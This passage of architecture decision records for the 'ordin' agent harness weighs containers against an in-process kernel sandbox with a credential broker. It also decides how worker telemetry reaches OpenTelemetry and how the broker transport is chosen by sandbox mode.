**Containerization considered.** The standard pattern for "agent does anything destructive" is "run the whole agent in a container". Container/VM tech has improved — Apple Containers (macOS 15+, microVM-per-container via Apple Virtualization Framework) and OrbStack close the filesystem-performance gap that Docker Desktop's bind mounts left open. Native arm64 Linux containers on Apple Silicon are no longer the perf disaster they were two years ago.

The remaining objections aren't about FS perf:

- *Credential mounting paradox.* Containers hide secrets from the host but not from the agent inside. To do anything useful (`git push`, `aws s3 cp`, `gh pr create`), users mount `~/.ssh`, `~/.aws`, `~/.config/gh` into the container — defeating the trust boundary. Most teams shrug and mount; the resulting trust model is theatre. The microVM doesn't fix this; only an in-container credential broker does (and at that point you've reimplemented the broker pattern).
- *Tool installation matrix.* Container is a Linux environment. macOS-installed binaries (Mach-O) don't execute under a Linux kernel even when the FS is mounted in. Users have to maintain a parallel Linux toolchain — `mise`/`asdf` inside, separate from their host one. Cache-friendly (subsequent installs hit layers) but a real config commitment.
- *Native macOS integrations.* `claude -p` with macOS Keychain auth, `gh` with macOS-stored OAuth, GPG signing via Keychain, browser-driven OAuth flows — none of these reach into a Linux container. Agents that depend on them have to be reauthenticated separately inside.
- *Local services.* Agent talks to `localhost:4000` (LiteLLM), `localhost:3000` (Langfuse). From inside a container, networking is `host.docker.internal` (mac), `172.17.0.1` (Linux without `--network=host`), or `localhost` (with `--network=host`). Cross-platform code juggles all three.
- *Docker-in-Docker.* If the agent's tools include building/running containers, DinD is heavy and slow; mounting the host Docker socket is convenient but a container-escape vector.

In short: microVM tech fixes the *performance* objection but not the *credential / tool-matrix / OS-integration* objections. Those are properties of the OS boundary, not the FS-sync mechanism.

ordin's in-process kernel sandbox + broker model keeps the host's toolchain and credentials visible to the agent (no OS boundary to cross), and gives container-grade isolation properties (egress allowlist, credential isolation, audit) via the broker. ADR-016 closes the in-process tool-execution gap that the kernel sandbox alone doesn't address — and ADR-018 makes the transport mode pluggable so the *physical* trust separation is available exactly when the user opts into it (sandboxed / hosted), without imposing process / RPC overhead on the default dev loop.

For multi-tenant hosted contexts (v3+; see ADR-001 trigger list item 4), containerization or microVMs remain the right *outer* layer — one container/VM per tenant — but the agent inside that container still benefits from broker-mediated tool dispatch for the same credential / audit / ACL reasons it does on a developer's laptop. Apple Containers / Firecracker compose with the broker pattern; they don't replace it.

**Migration path:**

1. Define the broker's tool-dispatch surface (`POST http://tools/dispatch`); add the broker hostname-map entry as an `internal` service.
2. Move `executeBash`, `executeWrite`, etc. from `src/worker/runtimes/shared/tools.ts` into a broker-side handler. Keep input shapes identical to ease the move.
3. Replace `ToolDispatcher.dispatch(...)` in `buildDispatcherTools.execute` with an HTTP call to the broker.
4. Implement the pattern scanner as a broker-side `before` hook on the dispatch handler (ADR-012's hook surface).
5. Audit-chain integration: every dispatch attempt produces an envelope.

Out of scope for this ADR: specific RPC framing (HTTP+JSON vs gRPC vs UDS), pattern-file location, and tool-runner process boundary (broker vs sibling). All resolved during implementation.

---

## ADR-017 — OTel telemetry direct from worker

**Status:** Provisional (v2 — observability transport)

**Context:** Mastra's Agent emits its own observability events (chat span, tool span, etc.). Today these are translated worker-side to `RuntimeEvent.timing` entries on stdout; the parent's OTel SDK creates spans on receipt (`src/orchestrator/phase-runner.ts:83-101`). Data is correct but hierarchy is flat — Mastra's spans land as siblings under `ordin.phase.<id>` instead of nesting properly. A 21-step run shows ~140 sibling spans in Langfuse instead of 21 expandable groups.

The original choice avoided `@mastra/langfuse`'s `LangfuseExporter` because `@langfuse/client` writes to stdout via init-time singletons we can't reliably mute before they corrupt the JSONL channel. This concern is specific to that vendor SDK; `@opentelemetry/exporter-trace-otlp-http` doesn't have it (its only stdout risk is OTel's `diag` logger, already silenced in the parent's bootstrap and trivially silenceable in the worker).

**Decision:** Bootstrap an OpenTelemetry SDK in the worker. Mastra's `Observability` container exports OTel spans via `OTLPTraceExporter` pointed at `http://otel/api/public/otel/v1/traces` — the broker hostname per ADR-015. Trace context propagates from parent to worker via `TRACEPARENT` (already in the worker env allowlist, `src/runtime/worker-policy.ts:30`).

**Consequences:**

- Mastra spans nest natively in OTel hierarchy. `ordin.phase.<id>` → `chat` → `chat <model>` / `tool: 'X'` reads correctly in Langfuse without parent-side reconstruction.
- ordin's per-turn / per-tool spans (`ordin.provider.turn`, `ordin.tool.<name>`) move into the worker as real OTel spans — created in-process so they nest inside the relevant Mastra spans naturally.
- Parent stops translating timing events into spans for the Mastra-derived stream. Parent OTel SDK retains responsibility for `ordin.run` / `ordin.phase.*` (lifecycle outside the worker).
- Worker OTel SDK uses `instrumentations: []` — no auto-instrumentation, no `http`/`dns`/`fs` hooks added behind our backs.
- Worker shutdown bounds `sdk.shutdown()` at 5s (matching the parent) so Langfuse outages don't hang worker exit.
- OTLP/HTTP transport flows through the broker per ADR-015 — credential injection (`Authorization: Basic <pk:sk>`) and audit chain unchanged.
- Sandbox compatibility: srt's transparent redirection routes `http://otel/...` to the broker; if it requires `HTTP_PROXY` in the worker env, only the non-secret broker proxy URL is added (the per-run secret stays in srt's `parentProxy.http`).

**Alternative considered: parent-side state machine reconstructing hierarchy from after-the-fact timing events.** ~50 LOC parent change; no worker bundle growth. Rejected because it reconstructs hierarchy that OTel already provides natively when used as designed. The "vendor-neutral via timing events" argument holds for runtime-internal telemetry (tools we own), not for vendor framework telemetry (Mastra spans).

---

## ADR-018 — Pluggable broker transport: in-process by default, HTTP under sandbox

**Status:** Provisional (v3 — paired with ADR-016)

**Context:** ADR-016 makes the broker the single dispatch point for tool execution. The naïve implementation forces every tool call through HTTP-over-localhost in every mode — including the default `--sandbox passthrough` dev loop, which gains no trust-separation benefit from a process boundary it doesn't have. ADR-001's B-process vs B-worker dichotomy was framed as a static architectural choice; in practice the transport between agent and broker can be a runtime selection, picked per the sandbox-mode UX defined in ADR-007.

**Decision:** Define the broker dispatch surface as an interface; provide two implementations, selected by sandbox mode.

```ts
interface BrokerClient {
  dispatchTool(intent: ToolIntent): Promise<ToolResult>;
  forwardTrace(span: SpanData): Promise<void>;
  forwardEgress(req: HttpRequest): Promise<HttpResponse>;
}

class InProcessBrokerClient implements BrokerClient { /* direct method calls into Broker */ }
class HttpBrokerClient implements BrokerClient { /* HTTP over localhost via broker */ }
```

Mode selection:

| Sandbox mode | Worker process | Transport | Trust boundary |
|---|---|---|---|
| `--sandbox passthrough` (default) | none — agent runs in harness | `InProcessBrokerClient` | logical (code discipline) |
| `--sandbox seatbelt` | spawned via srt | `HttpBrokerClient` over broker | physical (kernel + process) |
| `ordin serve` (v3+) | per-run worker | `HttpBrokerClient` | physical (process + outer container) |

The `Broker` class itself does not vary — ACL evaluation, pattern scanner, audit-chain append, credential injection all run identically regardless of how `dispatchTool` was invoked. Transport is a layer above policy.

**Consequences:**

- **Default mode is fast.** No process spawn, no HTTP serialization tax, no JSONL framing for the dev-loop case. Tool dispatch is a function call.
- **Sandboxed mode is strict.** The `HttpBrokerClient` + multi-process layout gives the trust-separation property — sandbox escape on the worker no longer grants tool access. The `InProcessBrokerClient` mode does not claim this property; ADR-016's "sandbox-escape resistance" applies only to multi-process transports.
- **One policy code path.** ACL, pattern scanner, audit-chain logic lives once in `src/broker/`. Tests run against both transports through a shared contract test ("same intent → same audit envelope, same decision, regardless of transport").
- **TUI lifecycle coupling avoided.** ADR-001 trigger 1 (TUI capability-query leakage during sandboxed reexec) only matters when there's a sandboxed reexec. In-process mode has no reexec; HTTP-transport mode is the B-worker variant where the host stays unsandboxed. The B-process variant ADR-001 originally chose — which has the coupling — is no longer needed.
- **Server modes resolve cleanly.** ADR-008 noted that `ordin serve` and `ordin mcp` cannot reexec mid-flight; B-worker is the only path. With pluggable transport, server modes always pick `HttpBrokerClient` regardless of sandbox-mode-the-user-asked-for, because crash isolation is a hard requirement for long-lived processes.
- **Test matrix doubles.** Each transport has its own integration tests for serialization / error semantics. Mitigation: keep the broker dispatch surface narrow, define typed errors that serialize cleanly, run a contract test that exercises both transports against the same broker policy code.
- **Audit-chain semantics must be identical across transports.** The contract test enforces this; any divergence is a bug, not a transport-specific quirk.

**Alternative considered: always-multi-process.** Always run a separate worker, always speak HTTP. Simpler model, one code path, predictable latency. Rejected because the default dev loop pays a measurable per-tool-call overhead for trust separation it isn't getting (no kernel sandbox in passthrough), and the in-process case is the most-trafficked path. The cost of two implementations is bounded; the cost of slower default-mode runs compounds across every dev-loop iteration.

**Alternative considered: always-in-process.** Drop the HTTP transport entirely; never spawn a separate worker. Rejected because it forecloses sandboxed-run trust separation (ADR-016's primary security property) and server-mode crash isolation (ADR-008's blocker). The HTTP transport is mandatory for those use cases; making it optional in the default dev loop is the right asymmetry.

**Relationship to ADR-001.** ADR-001 chose B-process for v1 and reserved B-worker. ADR-018 supersedes that framing implicitly: B-process and B-worker are no longer alternatives but transport modes selected per run. The B-process reexec-of-the-whole-CLI mechanism is retired (TUI coupling, server-mode incompatibility); single-process mode here means the agent runs in the harness process directly, with no kernel sandbox. Sandboxing always implies multi-process.
